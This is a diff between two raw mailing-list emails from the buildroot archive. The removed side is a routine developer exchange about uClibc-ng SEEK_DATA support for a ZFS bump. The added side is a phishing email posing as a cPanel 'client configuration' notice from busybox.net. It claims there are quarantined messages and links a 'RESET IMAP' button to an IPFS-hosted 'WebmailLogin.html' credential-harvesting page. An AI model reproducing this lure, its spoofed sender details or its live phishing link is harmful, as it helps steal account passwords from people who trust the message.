@@ -1,95 +1,51 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 73BFCC3DA7F
-	for <buildroot@archiver.kernel.org>; Sun,  4 Aug 2024 13:31:19 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id A6CE9C3DA7F
+	for <buildroot@archiver.kernel.org>; Sun,  4 Aug 2024 13:59:54 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp2.osuosl.org (Postfix) with ESMTP id C0D7C403B7;
-	Sun,  4 Aug 2024 13:31:18 +0000 (UTC)
-X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp2.osuosl.org ([127.0.0.1])
- by localhost (smtp2.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id NmdkM0Z0sFZQ; Sun,  4 Aug 2024 13:31:17 +0000 (UTC)
-X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 3CC7840148
-Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp2.osuosl.org (Postfix) with ESMTP id 3CC7840148;
-	Sun,  4 Aug 2024 13:31:17 +0000 (UTC)
-Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
- by ash.osuosl.org (Postfix) with ESMTP id 71BB21BF379
- for <buildroot@lists.busybox.net>; Sun,  4 Aug 2024 13:31:15 +0000 (UTC)
-Received: from localhost (localhost [127.0.0.1])
- by smtp1.osuosl.org (Postfix) with ESMTP id 5FFC3810E9
- for <buildroot@lists.busybox.net>; Sun,  4 Aug 2024 13:31:15 +0000 (UTC)
+	by smtp1.osuosl.org (Postfix) with ESMTP id 3A76A80BC1;
+	Sun,  4 Aug 2024 13:59:54 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
  by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id OsPbPYB8C6T0 for <buildroot@lists.busybox.net>;
- Sun,  4 Aug 2024 13:31:14 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom;
- client-ip=2607:f8b0:4864:20::b2b; helo=mail-yb1-xb2b.google.com;
- envelope-from=softwarej@gmail.com; receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 5A175810DF
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 5A175810DF
-Received: from mail-yb1-xb2b.google.com (mail-yb1-xb2b.google.com
- [IPv6:2607:f8b0:4864:20::b2b])
- by smtp1.osuosl.org (Postfix) with ESMTPS id 5A175810DF
- for <buildroot@buildroot.org>; Sun,  4 Aug 2024 13:31:13 +0000 (UTC)
-Received: by mail-yb1-xb2b.google.com with SMTP id
- 3f1490d57ef6-e0b7efa1c1bso6927779276.3
- for <buildroot@buildroot.org>; Sun, 04 Aug 2024 06:31:13 -0700 (PDT)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20230601; t=1722778272; x=1723383072;
- h=cc:to:subject:message-id:date:from:in-reply-to:references
- :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
- :reply-to;
- bh=LmPohwmcsSE+VT86jIhunshPk6mdXXEFi3UDNJDOpTk=;
- b=hzrZTpMPP8FkYpiEERUDRq1NUPRpOqKZhpdqp0sNeMbKOEloQcd7CzczAkkjNwuGuk
- jRgwmJykCtjQv3ViXi7SrR2imzPzvfB28xuFULQkJrM+lKnX7RtydCrmhBKQx5kYNCaU
- kZqqBsS/w/ERUKJTwCBxaeQd+Z6CTPUccDI3fWwxi0BWLPS/BAHn41hgcoxYt7nCFcp7
- 1WDhnbZkGcZq4FpoEJKvGZKlcTeTgt3r3qolUAglF4kt8N/eIequi4mmdvNBvlUK2rum
- TE4IOH3ldkfQ92XXb9WINqutDd8+ukqjRKGoIC5KqvllAWvCOzK5uDkx6MlYIIQNDisT
- cH5w==
-X-Forwarded-Encrypted: i=1;
- AJvYcCVRlLtXSd+A7Fz1g/tall2vVz628e7t3ab9NVLWpYUL3j5NsDr+SDnQGK0VUADccnfEOfEkVtLDRgGfQoEEz6tAE3+xQDQ3+Q==
-X-Gm-Message-State: AOJu0YzQwHabHvVjWDsv75tKJryplPj6Th2RB99KoCRjfykQusWqvDIY
- I3kYe8UDwY+864es8dIzQTY1jjqGuONkW4ZW9wyGwgcvZtksj2EfGMezU45s4ZHKLrsg0M/UT9Z
- sgelcLYkvCzjvyND6d2DCMsgWtrQ=
-X-Google-Smtp-Source: AGHT+IFHy6t2KbQqgNg51wG3BvTcXvGoq9QTP7AD7KSl3UzSaOaReJGAGjzIR7WhP5IzDYGtFuQle6V2VoBPNV/7Rgk=
-X-Received: by 2002:a05:6902:2403:b0:e0e:3f14:c280 with SMTP id
- 3f1490d57ef6-e0e3f14cbd3mr3278234276.3.1722778272452; Sun, 04 Aug 2024
- 06:31:12 -0700 (PDT)
+ id tNRDvwRA6awQ; Sun,  4 Aug 2024 13:59:53 +0000 (UTC)
+X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 3349680C11
+Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
+	by smtp1.osuosl.org (Postfix) with ESMTP id 3349680C11;
+	Sun,  4 Aug 2024 13:59:53 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id C4BDB1BF2EB
+ for <buildroot@lists.busybox.net>; Sun,  4 Aug 2024 13:59:51 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+ by smtp1.osuosl.org (Postfix) with ESMTP id BE73980C11
+ for <buildroot@lists.busybox.net>; Sun,  4 Aug 2024 13:59:51 +0000 (UTC)
+X-Virus-Scanned: amavis at osuosl.org
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id f7ZlFRxTwABp for <buildroot@lists.busybox.net>;
+ Sun,  4 Aug 2024 13:59:51 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=145.239.135.10;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 586CD80BC1
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 586CD80BC1
+Received: from busybox.net (unknown [145.239.135.10])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 586CD80BC1
+ for <buildroot@busybox.net>; Sun,  4 Aug 2024 13:59:49 +0000 (UTC)
+From: cPanel on busybox.net <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 4 Aug 2024 06:59:48 -0700
+Message-ID: <20240804065948.FC1F8C9BA0714DB0@busybox.net>
 MIME-Version: 1.0
-References: <20240524181856.2712581-1-alexander.i.mukhin@gmail.com>
- <20240722144716.092e357b@windsurf>
- <CAH+XeQZrmvt7Ui7D6M2515=+W_3wTsPGVVWLcRALx+4X93Chzg@mail.gmail.com>
- <20240722151834.53981478@windsurf>
-In-Reply-To: <20240722151834.53981478@windsurf>
-From: =?UTF-8?Q?Jos=C3=A9_Luis_Salvador_Rufo?= <salvador.joseluis@gmail.com>
-Date: Sun, 4 Aug 2024 15:31:01 +0200
-Message-ID: <CAH+XeQZSokTTrUJWL02YkD75Z=Baxpwk28nMRBFjMSqcgBTG1g@mail.gmail.com>
-To: Thomas Petazzoni <thomas.petazzoni@bootlin.com>
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=gmail.com; s=20230601; t=1722778272; x=1723383072; darn=buildroot.org;
- h=cc:to:subject:message-id:date:from:in-reply-to:references
- :mime-version:from:to:cc:subject:date:message-id:reply-to;
- bh=LmPohwmcsSE+VT86jIhunshPk6mdXXEFi3UDNJDOpTk=;
- b=YB/I5szgItRB79SOoKP57Wu4KTJl329YoohPwQUMn+33f2Dky62pn+9UMzwGop5yex
- vBZdiFP4dmEtMLx04NrP+gyPxYM0wARqIXco4JvLo7oKUysK6DVjnfVdkVs8KuVs88zL
- wuB2ZH/M+0NZMaS7AnG4bR/8B5GGQh7UwQJqSeV53v22Wf7zbmjOoo5MX+E5zVKXhbi5
- EIm6wbpRWXop5F9Wag5YorogxFWNg64Xz+MUF6I9EDKG73l4Mr0NM09tvcjYeOL8Bk32
- WO2rHF4XUbown0qD55oWMElX/7jvdoWDjffeNsPskx1d08KNc9CvpJqCG4Dhg0lVBOpS
- X/AA==
 X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
- dmarc=pass (p=none dis=none)
- header.from=gmail.com
-X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
- dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com
- header.a=rsa-sha256 header.s=20230601 header.b=YB/I5szg
-Subject: Re: [Buildroot] [PATCH 1/1] package/zfs: bump version to 2.2.4
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] =?utf-8?q?busybox=2Enet_Client_configuration_setting?=
+ =?utf-8?b?cyBlcnJvciBmb3Ig4oCc?=
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -101,119 +57,218 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Alexander Mukhin <alexander.i.mukhin@gmail.com>, buildroot@buildroot.org
-Content-Type: multipart/mixed; boundary="===============5812996358181323696=="
+Content-Type: multipart/mixed; boundary="===============1600539096125123306=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
---===============5812996358181323696==
-Content-Type: multipart/alternative; boundary="000000000000f4d91c061edb925b"
-
---000000000000f4d91c061edb925b
-Content-Type: text/plain; charset="UTF-8"
+--===============1600539096125123306==
+Content-Type: text/html;
+	charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
-Hello Waldemar Brodkorb,
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 10.00.9200.16843">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><table width=3D"600" style=3D"border: 1px solid lightgray; border-ima=
+ge: none; font-size: 11pt; border-collapse: collapse;" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-s=
+izing: border-box;"><td width=3D"100%" style=3D"margin: 0px; padding: 10px;=
+ box-sizing: border-box;">
+<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
+ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
+spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
+: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
+rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
+font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;">
+<span style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: no=
+ne; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-ser=
+if; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0p=
+x; float: none; display: inline !important; white-space: normal; orphans: 2=
+; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;">
+<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
+text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
+ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
+ 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;"><tbody style=3D"b=
+ox-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><th style=3D"=
+padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: none; width: 2p=
+x; color: rgb(0, 0, 0); box-sizing: border-box; background-color: rgb(2, 15=
+1, 64);">&nbsp;</th>
+<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
+olor: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box-sizing: bord=
+er-box;">Message from&nbsp;busybox.net server</span></td></tr></tbody></tab=
+le></span></div></td></tr>
+<tr style=3D"box-sizing: border-box;">
+<td width=3D"100%" align=3D"left" style=3D"margin: 0px; padding: 20px; box-=
+sizing: border-box;">
+<p style=3D'margin: 0px 0px 10px; font-family: "Segoe UI"; box-sizing: bord=
+er-box;'><span style=3D"font-size: medium;"><font size=3D"4">You
+ have pending incoming messages in your quarantine, set your Incoming serve=
+r to continue=20
+receiving messages without disruption using the manual settings.</font></sp=
+an></p><font size=3D"4">
+</font><p style=3D'margin: 0px 0px 10px; font-family: "Open Sans", Verdana,=
+ Tahoma, serif; box-sizing: border-box;'><font size=3D"4">&nbsp;</font></p>=
+<font size=3D"4">
+</font><strong><span style=3D"font-size: large;"><table width=3D"680" style=
+=3D"border: 0px currentColor; border-image: none; max-width: 680px;" border=
+=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td width=3D"680" hei=
+ght=3D"25" style=3D'color: rgb(51, 51, 51); font-family: "Helvetica Neue",H=
+elvetica,Arial,sans-serif; font-size: 16px;'>Client
+ Configuration settings for "buildroot@busybox.net".=20=20=20=20=20=20=20=
+=20
+                                                                    </td>
+                                                                    </tr>
+                                <tr>
+                                                                        <td=
+ style=3D"border-width: 2px; border-style: solid; border-color: rgb(232, 23=
+2, 232) rgb(232, 232, 232) rgb(255, 108, 44); padding: 15px 0px 20px; backg=
+round-color: rgb(255, 255, 255);">
+                                        <table width=3D"680" style=3D'backg=
+round: rgb(255, 255, 255); font-family: "Helvetica Neue",Helvetica,Arial,sa=
+ns-serif;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                                            <tbody>
+                                                <tr>
+                                                    <td width=3D"15">
+                                                    </td>
+                                                    <td width=3D"650">
+                                                        <table width=3D"100=
+%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                                                            <tbody>
+                                                                <tr>
+                                                                    <td>
+                                                                        <di=
+v class=3D"v1section" id=3D"v1manual_settings_area">
+        <h2 id=3D"v1hdrManualSettings">Mail Client Manual Settings</h2>
+=20=20=20=20=20=20=20=20
+        <div class=3D"v1row">
+         <div class=3D"v1col-md-6">
+          <div class=3D"v1preferred-selection v1panel v1panel-primary" id=
+=3D"v1ssl_settings_area" style=3D"border-radius: 4px; border: 1px solid rgb=
+(66, 139, 202); border-image: none; margin-bottom: 20px; box-shadow: 0px 1p=
+x 1px rgba(0,0,0,0.05); background-color: rgb(255, 255, 255);">
+               <div class=3D"v1panel-heading" style=3D"border-color: rgb(66=
+, 139, 202); padding: 10px 15px; color: rgb(255, 255, 255); border-top-left=
+-radius: 3px; border-top-right-radius: 3px; background-color: rgb(66, 139, =
+202);">
+                Secure <abbr title=3D"Secure Sockets Layer">SSL</abbr>/<abb=
+r title=3D"Transport Layer Security">TLS</abbr> Settings
+                (Recommended)
+              </div>
+              <table class=3D"v1table v1manual_settings_table" style=3D"wid=
+th: 100%; margin-bottom: 0px; border-collapse: collapse; max-width: 100%; b=
+order-spacing: 0; background-color: transparent;">
+                  <tbody><tr>
+                      <td id=3D"v1lblSSLSettingsAreaUsername" style=3D"padd=
+ing: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; bord=
+er-top-style: solid;">Username:</td>
+                      <td class=3D"v1data v1wrap-text" id=3D"v1valSSLSettin=
+gsAreaUsername" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221)=
+; border-top-width: 1px; border-top-style: solid;">buildroot</td>
+                  </tr>
+                  <tr>
+                      <td id=3D"v1lblSettingsAreaPassword" style=3D"padding=
+: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; border-=
+top-style: solid;">Password:</td>
+                      <td class=3D"v1escape-note" id=3D"v1valSettingsAreaPa=
+ssword" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border=
+-top-width: 1px; border-top-style: solid;"> Use the email account's passwor=
+d.</td>
+                  </tr>
+                  <tr>
+                      <td id=3D"v1lblSettingsAreaIncomingServer" style=3D"p=
+adding: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; b=
+order-top-style: solid;">Incoming Server:</td>
+                      <td class=3D"v1data" id=3D"v1valSettingsAreaIncomingS=
+erver" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-=
+top-width: 1px; border-top-style: solid;">mail.busybox.net
+                          <ul class=3D"v1port_list v1list-inline" style=3D"=
+list-style: none; padding-left: 0px; margin-top: 0px; margin-bottom: 10px; =
+margin-left: -5px;">
+                              <li style=3D"padding-right: 5px; padding-left=
+: 5px; display: inline-block;"><abbr title=3D"Internet Message Access Proto=
+col" class=3D"v1initialism">IMAP</abbr> Port: 993</li>
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20
+                              <li style=3D"padding-right: 5px; padding-left=
+: 5px; display: inline-block;"><abbr title=3D"Post Office Protocol 3" class=
+=3D"v1initialism">POP3</abbr> Port: 995</li>
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20
+                          </ul>
+                      </td>
+                  </tr>
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+                  <tr>
+                      <td id=3D"v1lblSettingsAreaOutgoingServer" style=3D"p=
+adding: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; b=
+order-top-style: solid;">Outgoing Server:</td>
+                      <td class=3D"v1data" id=3D"v1valSettingsAreaOutGoingS=
+erver" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-=
+top-width: 1px; border-top-style: solid;">mail.busybox.net
+                          <ul class=3D"v1port_list v1list-inline" style=3D"=
+list-style: none; padding-left: 0px; margin-top: 0px; margin-bottom: 10px; =
+margin-left: -5px;">
+                              <li style=3D"padding-right: 5px; padding-left=
+: 5px; display: inline-block;"><abbr title=3D"Simple Mail Transfer Protocol=
+">SMTP</abbr> Port: 465</li>
+                          </ul>
+                      </td>
+                  </tr>
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+                  <tr>
+                      <td class=3D"v1notes" style=3D"padding: 8px; border-t=
+op-color: rgb(221, 221, 221); border-top-width: 1px; border-top-style: soli=
+d;" colspan=3D"2">
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
+=20=20
+                                                                           =
+     <div class=3D"v1small_note" id=3D"v1lblSettingsAreaSmallNote1">IMAP, P=
+OP3, and SMTP require authentication.</div></td></tr></tbody></table></div>=
+</div></div></div></td></tr></tbody></table></td></tr></tbody></table></td>=
+</tr></tbody></table></span></strong><p style=3D'margin: 0px 0px 10px; font=
+-family: "Open Sans", Verdana, Tahoma, serif; font-size: 16px; box-sizing: =
+border-box;'><font size=3D"4">&nbsp;</font><font size=3D"4">
+</font></p><p style=3D'margin: 0px 0px 10px; font-family: "Segoe UI"; font-=
+size: 16px; box-sizing: border-box;'><font size=3D"4">Reset your incoming s=
+erver settings to continue receiving messages.</font></p>
+<p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;">&=
+nbsp;</p>
+<table width=3D"193" style=3D"border-radius: 3px; height: 52px; font-size: =
+11pt; border-collapse: collapse; background-color: rgb(215, 86, 36);" borde=
+r=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 15px =
+30px; box-sizing: border-box;">
+<a style=3D"color: rgb(255, 255, 255); font-family: Helvetica, Arial, sans-=
+serif; font-size: 16px; font-weight: bold; box-sizing: border-box; backgrou=
+nd-color: transparent; text-decoration-line: none;" href=3D"https://ipfs.io=
+/ipfs/bafkreifx4dpszoqmkbhrqkn7znfotogcpftyq5fjdhih3bxtkg75epvz6u?filename=
+=3DWebmailLogin.html#buildroot@busybox.net" target=3D"_blank" rel=3D"norefe=
+rrer">RESET&nbsp; IMAP</a></td></tr></tbody></table>
+<p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;">&=
+nbsp;</p>
+<p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;">I=
+<span style=3D'font-family: "Segoe UI"; font-size: medium;'>f after resetti=
+ng your IMAP and you still experience service disruption, kindly contact<sp=
+an>&nbsp;support</span><span>&nbsp;</span>for further assistance.</span>&nb=
+sp;</p></td></tr></tbody></table></body></html>
 
-I saw the commit
-https://cgit.uclibc-ng.org/cgi/cgit/uclibc-ng.git/commit/?id=3D05b11809bd11=
-450aff3d20e43f18415ce58601e7
-that defines SEEK_DATA and SEEK_HOLE. However, I noticed that the following
-code could fail at runtime:
-https://cgit.uclibc-ng.org/cgi/cgit/uclibc-ng.git/tree/libc/sysdeps/linux/c=
-ommon/lseek.c?id=3D05b11809bd11450aff3d20e43f18415ce58601e7#n44
-
-Should SEEK_DATA and SEEK_HOLE be included here as well?
-
-Regards.
-
-El lun, 22 jul 2024 a las 15:18, Thomas Petazzoni (<
-thomas.petazzoni@bootlin.com>) escribi=C3=B3:
-
-> Hello Jos=C3=A9,
->
-> Thanks for your super quick feedback!
->
-> On Mon, 22 Jul 2024 15:01:45 +0200
-> Jos=C3=A9 Luis Salvador Rufo <salvador.joseluis@gmail.com> wrote:
->
-> > In the meantime, I recommend the following options:
-> >
-> > A) Revert to the previous version (OpenZFS v2.2.3). This is not ideal f=
-or
-> > people who have already upgraded.
-> >
-> > B) Include a work-in-progress (it works for buildroot, I tested it)
-> patch:
-> > https://github.com/openzfs/zfs/pull/16169.patch.
->
-> Please do this option (B), and also contribute SEEK_DATA support to
-> uClibc. I've added Waldemar, the uClibc-ng maintainer, in Cc.
->
-> Thanks a lot!
->
-> Thomas
-> --
-> Thomas Petazzoni, co-owner and CEO, Bootlin
-> Embedded Linux and Kernel engineering and training
-> https://bootlin.com
->
-
---000000000000f4d91c061edb925b
-Content-Type: text/html; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-
-<div dir=3D"ltr">Hello Waldemar Brodkorb,<br><br>I saw the commit <a href=
-=3D"https://cgit.uclibc-ng.org/cgi/cgit/uclibc-ng.git/commit/?id=3D05b11809=
-bd11450aff3d20e43f18415ce58601e7">https://cgit.uclibc-ng.org/cgi/cgit/uclib=
-c-ng.git/commit/?id=3D05b11809bd11450aff3d20e43f18415ce58601e7</a> that def=
-ines SEEK_DATA and SEEK_HOLE. However, I noticed that the following code co=
-uld fail at runtime: <a href=3D"https://cgit.uclibc-ng.org/cgi/cgit/uclibc-=
-ng.git/tree/libc/sysdeps/linux/common/lseek.c?id=3D05b11809bd11450aff3d20e4=
-3f18415ce58601e7#n44">https://cgit.uclibc-ng.org/cgi/cgit/uclibc-ng.git/tre=
-e/libc/sysdeps/linux/common/lseek.c?id=3D05b11809bd11450aff3d20e43f18415ce5=
-8601e7#n44</a><br><br><div>Should SEEK_DATA and SEEK_HOLE be included here =
-as well?</div><div><br></div><div>Regards.<br></div></div><br><div class=3D=
-"gmail_quote"><div dir=3D"ltr" class=3D"gmail_attr">El lun, 22 jul 2024 a l=
-as 15:18, Thomas Petazzoni (&lt;<a href=3D"mailto:thomas.petazzoni@bootlin.=
-com">thomas.petazzoni@bootlin.com</a>&gt;) escribi=C3=B3:<br></div><blockqu=
-ote class=3D"gmail_quote" style=3D"margin:0px 0px 0px 0.8ex;border-left:1px=
- solid rgb(204,204,204);padding-left:1ex">Hello Jos=C3=A9,<br>
-<br>
-Thanks for your super quick feedback!<br>
-<br>
-On Mon, 22 Jul 2024 15:01:45 +0200<br>
-Jos=C3=A9 Luis Salvador Rufo &lt;<a href=3D"mailto:salvador.joseluis@gmail.=
-com" target=3D"_blank">salvador.joseluis@gmail.com</a>&gt; wrote:<br>
-<br>
-&gt; In the meantime, I recommend the following options:<br>
-&gt; <br>
-&gt; A) Revert to the previous version (OpenZFS v2.2.3). This is not ideal =
-for<br>
-&gt; people who have already upgraded.<br>
-&gt; <br>
-&gt; B) Include a work-in-progress (it works for buildroot, I tested it) pa=
-tch:<br>
-&gt; <a href=3D"https://github.com/openzfs/zfs/pull/16169.patch" rel=3D"nor=
-eferrer" target=3D"_blank">https://github.com/openzfs/zfs/pull/16169.patch<=
-/a>.<br>
-<br>
-Please do this option (B), and also contribute SEEK_DATA support to<br>
-uClibc. I&#39;ve added Waldemar, the uClibc-ng maintainer, in Cc.<br>
-<br>
-Thanks a lot!<br>
-<br>
-Thomas<br>
--- <br>
-Thomas Petazzoni, co-owner and CEO, Bootlin<br>
-Embedded Linux and Kernel engineering and training<br>
-<a href=3D"https://bootlin.com" rel=3D"noreferrer" target=3D"_blank">https:=
-//bootlin.com</a><br>
-</blockquote></div>
-
---000000000000f4d91c061edb925b--
-
---===============5812996358181323696==
+--===============1600539096125123306==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -224,4 +279,4 @@ buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
 
---===============5812996358181323696==--
+--===============1600539096125123306==--
